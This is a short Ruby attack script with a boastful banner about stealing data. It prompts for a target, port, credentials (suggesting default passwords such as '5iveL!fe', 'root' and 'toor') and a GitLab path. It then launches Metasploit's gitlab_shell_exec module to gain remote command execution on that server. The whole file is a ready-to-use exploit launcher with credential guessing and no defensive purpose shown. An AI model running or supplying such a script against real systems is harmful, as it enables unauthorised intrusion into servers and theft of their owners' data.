puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...

            SSH User Code Execution

	           	Linux x86

       		 Starting Port:: 80   

"""

puts " [?] What is the target? "
print "[!] ---> "

target = gets.chomp

puts " [?] What is the Port ? [Start with 80]  "
print "[!] ---> "

port = gets.chomp

puts " [?] What is the Username? [sync] or maybe [root, toor] "
print "[!] ---> "

name = gets.chomp

puts " [?] What is the Password? [5iveL!fe] or maybe [root, toor] "
print "[!] ---> "

pass = gets.chomp


puts " [?] What is the target path to Gitlab? [/] "
print "[!] ---> "

url = gets.chomp

exec("msfconsole -x 'use exploit/multi/http/gitlab_shell_exec' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'set USERNAME #{name}' -x 'set PASSWORD #{pass}' -x 'set TARGETURI #{url}' -x 'run' 'run'")
